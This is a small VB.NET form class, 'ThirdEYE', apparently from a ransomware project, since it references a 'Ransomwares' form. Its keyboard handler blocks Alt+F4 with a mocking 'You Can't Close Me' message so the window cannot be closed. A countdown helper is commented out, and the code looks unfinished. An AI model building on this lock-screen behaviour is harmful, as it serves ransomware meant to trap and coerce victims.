Public Class ThirdEYE
    Dim Ras As Ransomwares
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        ' Label2.Text = GetHour()
    End Sub

    Private Sub ThirdEYE_Load(sender As Object, e As EventArgs) Handles Me.Load

    End Sub

    Private Sub Label1_VisibleChanged(sender As Object, e As EventArgs) Handles Label1.VisibleChanged

    End Sub

    Private Sub ThirdEYE_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If Ras.CheckBox2.Checked = True Then
            If e.KeyData = Keys.Alt + Keys.F4 Then
                MessageBox.Show("Lol!!!😅 😆 😄 You Can't Close Me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                e.Handled = True
            End If
            Label5.Text = "TEST GOOD CHECKED"
        ElseIf Ras.CheckBox2.Checked = False Then
            e.Handled = False
            Label5.Text = "TEST GOOD UNCHECKED"
        Else
            Label5.Text = "TEST FAILED"
        End If
    End Sub

    'Private Shared Function GetHour() As Double
    'Return Ransomwares.hour
    ' End Function
End Class